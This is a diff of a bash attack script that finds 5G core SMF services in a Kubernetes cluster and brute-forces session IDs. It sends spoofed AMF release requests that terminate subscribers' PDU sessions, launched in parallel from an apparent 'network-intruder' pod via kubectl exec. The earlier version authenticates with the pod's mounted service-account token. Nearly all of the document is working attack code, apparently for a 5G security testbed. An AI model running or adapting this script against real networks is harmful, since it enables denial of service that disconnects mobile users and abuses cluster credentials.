@@ -3,8 +3,9 @@
 # bruteForceAttack.sh
 #
 # Brute-force attack script for SMF session termination.
-# Automatically discovers all SMF SBI services across Kubernetes namespaces
-# or accepts a list of explicit SMF service hostnames.
+# Runs from a Kubernetes node, discovers SMF SBI services via kubectl,
+# and executes the attack commands inside a network-intruder pod
+# (where cluster DNS and networking are available).
 #
 
 set -euo pipefail
@@ -13,27 +14,18 @@ set -euo pipefail
 # CONFIGURATION
 # ============================================================================
 
-# Number of session IDs to brute-force (can be overridden via END environment variable)
+# Number of session IDs to brute-force
 END=${END:-2000}
 
 # 5G Location Information Parameters (used in attack payload)
-# These can be overridden via command-line arguments
 MCC=${MCC:-"208"}              # Mobile Country Code
 MNC=${MNC:-"93"}               # Mobile Network Code
 TAC=${TAC:-"000001"}           # Tracking Area Code
 NR_CELL_ID=${NR_CELL_ID:-"000000010"}  # NR Cell ID
 
-# Kubernetes API credentials (automatically mounted by kubelet)
-K8S_TOKEN=/var/run/secrets/kubernetes.io/serviceaccount/token
-K8S_CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-
-# Kubernetes API endpoint
-K8S_HOST=${KUBERNETES_SERVICE_HOST:-}
-K8S_PORT=${KUBERNETES_SERVICE_PORT:-443}
-K8S_API=""
-if [ -n "$K8S_HOST" ]; then
-  K8S_API="https://${K8S_HOST}:${K8S_PORT}"
-fi
+# Pod used to execute the attack (auto-discovered if not provided)
+EXEC_NAMESPACE=""
+EXEC_POD=""
 
 # ============================================================================
 # USAGE AND HELP
@@ -44,164 +36,150 @@ function show_usage() {
 Usage: $0 [OPTIONS] [TARGETS]
 
 Brute-force SMF session IDs to trigger session termination.
+Runs from a Kubernetes node and executes attacks inside a network-intruder pod.
 
 OPTIONS:
-  --auto              Automatically discover all SMF services in the cluster
-                      (DEFAULT - used if no other arguments provided)
-  --help, -h          Show this help message
-  --count N           Number of session IDs to brute-force (default: 2000)
-                      Can also set via END environment variable
+  --auto                Auto-discover all SMF SBI services in the cluster
+                        (DEFAULT - used if no TARGETS are provided)
+  --help, -h            Show this help message
+  --count N             Number of session IDs to brute-force (default: 2000)
+  --exec-pod NAME       Pod to execute attacks from (default: auto-discover network-intruder)
+  --exec-namespace NS   Namespace of the exec pod (default: auto-discover)
 
 5G LOCATION PARAMETERS (optional):
-  --mcc MCC           Mobile Country Code (default: 208)
-  --mnc MNC           Mobile Network Code (default: 93)
-  --tac TAC           Tracking Area Code (default: 000001)
-  --nrCellId ID       NR Cell ID (default: 000000010)
-
-  These parameters configure the UE location in the attack payload.
-  Environment variables: MCC, MNC, TAC, NR_CELL_ID
+  --mcc MCC             Mobile Country Code (default: 208)
+  --mnc MNC             Mobile Network Code (default: 93)
+  --tac TAC             Tracking Area Code (default: 000001)
+  --nrCellId ID         NR Cell ID (default: 000000010)
 
 TARGETS (when --auto is not used):
-  List of SMF service hostnames/FQDNs/IPs
+  SMF service FQDNs or IPs (must be reachable from inside the exec pod)
   Examples:
-    $0 open5gs-smf.default.svc.cluster.local
+    $0 open5gs-smf.noztx5gc.svc.cluster.local
     $0 open5gs-smf.ns1.svc.cluster.local open5gs-smf.ns2.svc.cluster.local
-    $0 192.168.1.100
-
-ENVIRONMENT VARIABLES:
-  END                 Number of session IDs to brute-force (default: 2000)
-  MCC                 Mobile Country Code (default: 208)
-  MNC                 Mobile Network Code (default: 93)
-  TAC                 Tracking Area Code (default: 000001)
-  NR_CELL_ID          NR Cell ID (default: 000000010)
 
 EXAMPLES:
-  # Automatic discovery with default parameters
+  # Auto-discover SMF services and network-intruder pod
   $0
   $0 --auto
 
-  # Explicit targets with default parameters
-  $0 open5gs-smf.default.svc.cluster.local
+  # Explicit targets
+  $0 open5gs-smf.noztx5gc.svc.cluster.local
   $0 open5gs-smf.ns1.svc.cluster.local open5gs-smf.ns2.svc.cluster.local
 
-  # Custom session ID count
-  $0 --count 5000
-  END=5000 $0
+  # Custom session count and 5G parameters
+  $0 --count 5000 --mcc 310 --mnc 410
 
-  # Custom 5G location parameters
-  $0 --mcc 310 --mnc 410
-  $0 --mcc 208 --mnc 93 --tac 000002 --nrCellId 000000020
-
-  # Mix options with explicit targets
-  $0 --count 3000 --mcc 310 --mnc 410 service1 service2
-
-  # Via environment variables
-  MCC=310 MNC=410 $0
+  # Specify which pod to execute from
+  $0 --exec-namespace ztx5gc --exec-pod network-intruder-abc123
 
 USAGE
-}
-
-# ============================================================================
-# KUBERNETES API FUNCTIONS
-# ============================================================================
-
-# Make an authenticated API request to the Kubernetes API server
-function api_request() {
-  local path="$1"
-  curl -sS --cacert "$K8S_CA" \
-    -H "Authorization: Bearer $(cat "$K8S_TOKEN")" \
-    "$K8S_API$path"
-}
-
-# Get all namespace names in the cluster
-function list_namespaces() {
-  api_request "/api/v1/namespaces" | python3 -c \
-    'import json,sys; data=json.load(sys.stdin); print("\n".join([item["metadata"]["name"] for item in data["items"]]))'
-}
-
-# Get SMF service names in a specific namespace
-# Filters services matching "smf" in name or labels
-function list_smf_services_in_namespace() {
-  local ns="$1"
-  api_request "/api/v1/namespaces/${ns}/services" | python3 -c \
-    'import json,sys,re
-data=json.load(sys.stdin)
-for item in data["items"]:
-    name = item["metadata"]["name"]
-    labels = item["metadata"].get("labels", {})
-    # Check if "smf" appears in service name or any label value
-    if re.search(r"smf", name, re.I) or any(re.search(r"smf", str(v), re.I) for v in labels.values()):
-        print(name)'
-}
-
-# ============================================================================
-# ATTACK FUNCTIONS
-# ============================================================================
-
-# Perform brute-force session ID attack against a single SMF service
-# Arguments:
-#   $1 - SMF service hostname/FQDN/IP
-#   $2 - Number of session IDs to try (END value)
-function brute_force() {
-  local smf_host="$1"
-  local end="$2"
-  local i
-  local op
-
-  for i in $(seq 1 "$end"); do
-    # Send a release request with a brute-forced session ID
-    # If the session exists, SMF returns 204 No Content
-    # The UE location is configured with MCC, MNC, TAC, and NR Cell ID
-    op=$(curl -s -o /dev/null -w "%{http_code}" \
-      --request POST \
-      -d "{\"ueLocation\":{\"nrLocation\":{\"tai\":{\"plmnId\":{\"mcc\":\"${MCC}\",\"mnc\":\"${MNC}\"},\"tac\":\"${TAC}\"},\"ncgi\":{\"plmnId\":{\"mcc\":\"${MCC}\",\"mnc\":\"${MNC}\"},\"nrCellId\":\"${NR_CELL_ID}\"},\"ueLocationTimestamp\":\"2026-05-29T03:19:48.206301Z\"}},\"ueTimeZone\":\"-05:00\"}" \
-      -H "Content-Type: application/json" \
-      --http2-prior-knowledge \
-      -A "AMF" \
-      "http://${smf_host}/nsmf-pdusession/v1/sm-contexts/${i}/release")
-
-    # If HTTP 204, the session was found and terminated
-    if [ "$op" = "204" ]; then
-      echo
-      echo "Time = $(date)"
-      echo "Attack successful for session with user context $i"
-      echo "Interface-Type = Service-based"
-      echo "Interface = AMF-SMF"
-      echo "NF Hostname = $smf_host"
-    fi
-  done
 }
 
 # ============================================================================
 # DISCOVERY FUNCTIONS
 # ============================================================================
 
-# Automatically discover all SMF SBI services across all cluster namespaces
-# Returns FQDNs in the format: <service>.<namespace>.svc.cluster.local
-function discover_smf_services_auto() {
-  local services=()
+# Find a running network-intruder pod in the cluster
+# Sets EXEC_NAMESPACE and EXEC_POD globals
+function find_intruder_pod() {
+  local pod_info
+  pod_info=$(kubectl get pods --all-namespaces --no-headers 2>/dev/null \
+    | grep -i "network-intruder" \
+    | grep -i "running" \
+    | head -1) || true
 
-  # Check if Kubernetes API is available
-  if [ -z "$K8S_API" ] || [ ! -f "$K8S_TOKEN" ] || [ ! -f "$K8S_CA" ]; then
-    echo "ERROR: Kubernetes service discovery unavailable." >&2
-    echo "       Cannot access Kubernetes API." >&2
-    return 1
+  if [ -z "$pod_info" ]; then
+    echo "ERROR: No running network-intruder pod found in the cluster." >&2
+    echo "       Use --exec-namespace and --exec-pod to specify manually." >&2
+    exit 1
   fi
 
-  # Iterate through all namespaces and collect SMF services
+  EXEC_NAMESPACE=$(echo "$pod_info" | awk '{print $1}')
+  EXEC_POD=$(echo "$pod_info" | awk '{print $2}')
+}
+
+# Get all namespace names in the cluster
+function list_namespaces() {
+  kubectl get namespaces -o jsonpath='{.items[*].metadata.name}' | tr ' ' '\n'
+}
+
+# Get SMF SBI service names in a specific namespace
+# Matches "smf" in name/labels, excludes non-SBI services (pfcp, metrics, etc.)
+function list_smf_services_in_namespace() {
+  local ns="$1"
+  kubectl get services -n "$ns" -o json 2>/dev/null | python3 -c \
+    'import json,sys,re
+data=json.load(sys.stdin)
+for item in data["items"]:
+    name = item["metadata"]["name"]
+    labels = item["metadata"].get("labels", {})
+    has_smf = re.search(r"smf", name, re.I) or any(re.search(r"smf", str(v), re.I) for v in labels.values())
+    is_excluded = re.search(r"pfcp|metrics|prometheus|monitor", name, re.I)
+    if has_smf and not is_excluded:
+        print(name)' || true
+}
+
+# Discover all SMF SBI services across all namespaces
+# Returns FQDNs: <service>.<namespace>.svc.cluster.local
+function discover_smf_services() {
+  local found=()
+
   for ns in $(list_namespaces); do
     for svc in $(list_smf_services_in_namespace "$ns"); do
-      services+=("${svc}.${ns}.svc.cluster.local")
+      found+=("${svc}.${ns}.svc.cluster.local")
     done
   done
 
-  # Check if any services were found
-  if [ ${#services[@]} -eq 0 ]; then
-    echo "ERROR: No SMF services found in any namespace." >&2
+  if [ ${#found[@]} -eq 0 ]; then
+    echo "ERROR: No SMF SBI services found in any namespace." >&2
     return 1
   fi
 
-  printf '%s\n' "${services[@]}"
+  printf '%s\n' "${found[@]}"
+}
+
+# ============================================================================
+# ATTACK FUNCTION
+# ============================================================================
+
+# Execute brute-force attack against a single SMF service inside the exec pod.
+#
+# How it works:
+#   1. This function builds a bash script with the brute-force loop.
+#   2. The script is sent to the network-intruder pod via "kubectl exec".
+#   3. Inside the pod, CoreDNS resolves the SMF FQDN and curl sends requests.
+#
+# Arguments:
+#   $1 - SMF service FQDN (resolvable from inside the pod via CoreDNS)
+function run_attack_in_pod() {
+  local smf_host="$1"
+
+  echo "  -> $smf_host (via $EXEC_NAMESPACE/$EXEC_POD)"
+
+  # The heredoc below is a bash script that runs INSIDE the pod.
+  # Variables like ${smf_host}, ${END}, ${MCC} are expanded HERE (on the node)
+  # and baked into the command before sending to the pod.
+  # Variables like \$i and \$op are escaped so they run INSIDE the pod.
+  kubectl exec -i -n "$EXEC_NAMESPACE" "$EXEC_POD" -- bash <<ATTACK_CMD
+for i in \$(seq 1 ${END}); do
+  op=\$(curl -s -o /dev/null -w "%{http_code}" \\
+    --request POST \\
+    -d '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"${MCC}","mnc":"${MNC}"},"tac":"${TAC}"},"ncgi":{"plmnId":{"mcc":"${MCC}","mnc":"${MNC}"},"nrCellId":"${NR_CELL_ID}"},"ueLocationTimestamp":"2026-05-29T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}' \\
+    -H "Content-Type: application/json" \\
+    --http2-prior-knowledge \\
+    -A "AMF" \\
+    "http://${smf_host}/nsmf-pdusession/v1/sm-contexts/\${i}/release")
+  if [ "\$op" = "204" ]; then
+    echo
+    echo "Time = \$(date)"
+    echo "Attack successful for session with user context \$i"
+    echo "Interface-Type = Service-based"
+    echo "Interface = AMF-SMF"
+    echo "NF Hostname = ${smf_host}"
+  fi
+done
+ATTACK_CMD
 }
 
 # ============================================================================
@@ -211,117 +189,90 @@ function discover_smf_services_auto() {
 function main() {
   local use_auto=false
   local targets=()
-  local arg
 
   # Parse command-line arguments
   while [ $# -gt 0 ]; do
-    arg="$1"
-    shift
-
-    case "$arg" in
+    case "$1" in
       --auto)
         use_auto=true
-        ;;
+        shift ;;
       --help|-h)
         show_usage
-        exit 0
-        ;;
+        exit 0 ;;
       --count)
-        if [ $# -eq 0 ]; then
-          echo "ERROR: --count requires a value" >&2
-          show_usage
-          exit 1
-        fi
-        END="$1"
-        shift
-        ;;
+        if [ $# -lt 2 ]; then echo "ERROR: --count requires a value" >&2; exit 1; fi
+        END="$2"; shift 2 ;;
       --mcc)
-        if [ $# -eq 0 ]; then
-          echo "ERROR: --mcc requires a value" >&2
-          show_usage
-          exit 1
-        fi
-        MCC="$1"
-        shift
-        ;;
+        if [ $# -lt 2 ]; then echo "ERROR: --mcc requires a value" >&2; exit 1; fi
+        MCC="$2"; shift 2 ;;
       --mnc)
-        if [ $# -eq 0 ]; then
-          echo "ERROR: --mnc requires a value" >&2
-          show_usage
-          exit 1
-        fi
-        MNC="$1"
-        shift
-        ;;
+        if [ $# -lt 2 ]; then echo "ERROR: --mnc requires a value" >&2; exit 1; fi
+        MNC="$2"; shift 2 ;;
       --tac)
-        if [ $# -eq 0 ]; then
-          echo "ERROR: --tac requires a value" >&2
-          show_usage
-          exit 1
-        fi
-        TAC="$1"
-        shift
-        ;;
+        if [ $# -lt 2 ]; then echo "ERROR: --tac requires a value" >&2; exit 1; fi
+        TAC="$2"; shift 2 ;;
       --nrCellId)
-        if [ $# -eq 0 ]; then
-          echo "ERROR: --nrCellId requires a value" >&2
-          show_usage
-          exit 1
-        fi
-        NR_CELL_ID="$1"
-        shift
-        ;;
+        if [ $# -lt 2 ]; then echo "ERROR: --nrCellId requires a value" >&2; exit 1; fi
+        NR_CELL_ID="$2"; shift 2 ;;
+      --exec-pod)
+        if [ $# -lt 2 ]; then echo "ERROR: --exec-pod requires a value" >&2; exit 1; fi
+        EXEC_POD="$2"; shift 2 ;;
+      --exec-namespace)
+        if [ $# -lt 2 ]; then echo "ERROR: --exec-namespace requires a value" >&2; exit 1; fi
+        EXEC_NAMESPACE="$2"; shift 2 ;;
       -*)
-        echo "ERROR: Unknown option: $arg" >&2
+        echo "ERROR: Unknown option: $1" >&2
         show_usage
-        exit 1
-        ;;
+        exit 1 ;;
       *)
-        # Treat as a target SMF service
-        targets+=("$arg")
-        ;;
+        targets+=("$1")
+        shift ;;
     esac
   done
 
-  # Determine if we should use auto-discovery
-  # Default to auto if no targets were provided
+  # Default to auto-discovery if no targets provided
   if [ ${#targets[@]} -eq 0 ]; then
     use_auto=true
   fi
 
-  # Perform auto-discovery if requested
+  # Step 1: Discover SMF services if using auto mode
   if [ "$use_auto" = true ]; then
-    echo "Auto-discovering SMF services in the cluster..."
+    echo "Auto-discovering SMF SBI services..."
     while IFS= read -r svc; do
-      if [ -n "$svc" ]; then
-        targets+=("$svc")
-      fi
-    done < <(discover_smf_services_auto)
+      [ -n "$svc" ] && targets+=("$svc")
+    done < <(discover_smf_services)
   fi
 
-  # Verify we have targets
   if [ ${#targets[@]} -eq 0 ]; then
-    echo "ERROR: No SMF services available to attack." >&2
+    echo "ERROR: No SMF services to attack." >&2
     exit 1
   fi
 
-  echo "Starting brute-force attack against ${#targets[@]} SMF service(s)..."
-  echo "Session ID range: 1 to $END"
-  echo "5G Location: MCC=$MCC, MNC=$MNC, TAC=$TAC, NR_CELL_ID=$NR_CELL_ID"
+  # Step 2: Find the exec pod (network-intruder) if not specified
+  if [ -z "$EXEC_POD" ] || [ -z "$EXEC_NAMESPACE" ]; then
+    echo "Finding network-intruder pod..."
+    find_intruder_pod
+  fi
+
+  # Step 3: Show attack summary
+  echo
+  echo "Exec pod:       $EXEC_NAMESPACE/$EXEC_POD"
+  echo "Targets:        ${targets[*]}"
+  echo "Session range:  1 to $END"
+  echo "5G Location:    MCC=$MCC, MNC=$MNC, TAC=$TAC, NR_CELL_ID=$NR_CELL_ID"
   echo "---"
 
-  # Launch brute-force attack in parallel against each SMF service
+  # Step 4: Launch attacks in parallel (one kubectl exec per target)
   for svc in "${targets[@]}"; do
-    echo "Attacking: $svc"
-    brute_force "$svc" "$END" &
+    run_attack_in_pod "$svc" &
   done
 
-  # Wait for all background jobs to complete
+  # Wait for all parallel attacks to finish
   wait
 
   echo "---"
   echo "Attack completed."
 }
 
-# Run main function with all arguments
+# Entry point
 main "$@"
